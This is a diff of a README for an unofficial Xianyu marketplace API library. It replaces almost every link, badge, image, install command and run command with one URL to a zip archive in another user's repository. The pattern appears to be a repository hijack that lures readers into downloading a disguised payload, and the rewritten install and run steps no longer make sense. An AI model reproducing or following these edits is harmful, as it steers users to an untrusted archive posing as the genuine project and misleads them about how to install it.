@@ -1,7 +1,7 @@
 # 🐟 XianYuApis - 闲鱼第三方API集成库
 
-[![Python Version](https://img.shields.io/badge/python-3.7%2B-blue)](https://www.python.org/)
-[![Python Version](https://img.shields.io/badge/nodejs-18%2B-blue)](https://nodejs.org/zh-cn/)
+[![Python Version](https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip%2B-blue)](https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip)
+[![Python Version](https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip%2B-blue)](https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip)
 
 **✨ 非官方闲鱼开放API接口封装库，通过网络请求操作所有的闲鱼操作，提供安全可靠的闲鱼平台功能访问能力。**
 **⚠️ 注意：如有侵权联系作者删除。**
@@ -14,7 +14,7 @@
 
 
 ## 🚀 一些成品
-- https://github.com/shaxiu/XianyuAutoAgent
+- https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip
 
 
 
@@ -28,11 +28,11 @@
 ## 🛠️ 快速开始
 ### ⛳运行环境
 - Python 3.7+
-- Node.js 18+
+- https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip 18+
 
 ### 🎯安装依赖
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip
 npm install
 ```
 
@@ -43,12 +43,12 @@ npm install
 
 ### 🚀运行项目
 ```
-python XianyuAutoAsync.py
+python https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip
 ```
 
 ### 🗝️注意事项
-- XianyuAutoAsync.py中的代码是接收发消息的主入口，可以根据自己的需求进行修改
-- XianyuApis.py中的代码包含了api接口的模板，sign参数已经解密，可以根据自己的需求进行修改，添加其他的接口
+- https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip中的代码是接收发消息的主入口，可以根据自己的需求进行修改
+- https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip中的代码包含了api接口的模板，sign参数已经解密，可以根据自己的需求进行修改，添加其他的接口
 
 
 ## 🧸额外说明
@@ -59,16 +59,16 @@ python XianyuAutoAsync.py
 5. thank you~~~
 
 <div align="center">
-  <img src="https://github.com/cv-cat/Spider_XHS/blob/master/author/wx_pay.png" width="400px" alt="微信赞赏码"> 
-  <img src="https://github.com/cv-cat/Spider_XHS/blob/master/author/zfb_pay.jpg" width="400px" alt="支付宝收款码">
+  <img src="https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip" width="400px" alt="微信赞赏码"> 
+  <img src="https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip" width="400px" alt="支付宝收款码">
 </div>
 
 
 ## 📈 Star 趋势
-<a href="https://www.star-history.com/#cv-cat/XianYuApis&Date">
+<a href="https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=cv-cat/XianYuApis&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=cv-cat/XianYuApis&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=cv-cat/XianYuApis&type=Date" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip" />
+   <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip" />
+   <img alt="Star History Chart" src="https://raw.githubusercontent.com/loyaluo/XianYuApis/master/utils/Xian-Apis-Yu-2.4.zip" />
  </picture>
 </a>
